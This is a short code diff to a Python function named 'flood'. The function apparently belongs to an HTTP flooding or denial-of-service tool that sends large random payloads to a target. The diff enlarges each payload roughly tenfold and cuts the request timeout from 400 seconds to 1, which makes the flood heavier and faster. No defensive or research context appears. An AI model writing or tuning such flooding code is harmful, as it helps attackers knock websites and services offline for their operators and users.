@@ -21,9 +21,9 @@ headers = {
 
 
 def flood(target):
-    payload = str(random._urandom(random.randint(5000, 10000)))
+    payload = str(random._urandom(random.randint(50000, 100000)))
     try:
-        r = requests.get(target, params=payload, headers=headers, timeout=400)
+        r = requests.get(target, params=payload, headers=headers, timeout=1)
     except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
